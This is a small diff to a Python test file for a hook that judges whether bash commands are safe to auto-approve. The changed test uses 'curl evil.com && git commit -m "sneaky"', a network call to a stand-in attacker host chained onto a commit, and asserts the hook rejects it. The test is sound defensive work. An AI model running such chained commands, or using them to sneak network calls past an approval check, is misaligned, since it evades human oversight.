@@ -900,9 +900,9 @@ EOF
         cmd = 'git add . && git commit -m "chore: update"'
         assert hook.is_safe_bash(cmd) is True
 
-    def test_compound_not_starting_with_git_add(self):
-        """Only git add && git commit is safe, not arbitrary && git commit."""
-        cmd = 'echo hi && git commit -m "sneaky"'
+    def test_compound_not_starting_with_unsafe(self):
+        """Compound with unsafe segment should NOT be approved."""
+        cmd = 'curl evil.com && git commit -m "sneaky"'
         assert hook.is_safe_bash(cmd) is False
 
     def test_git_add_and_commit_integration(self):
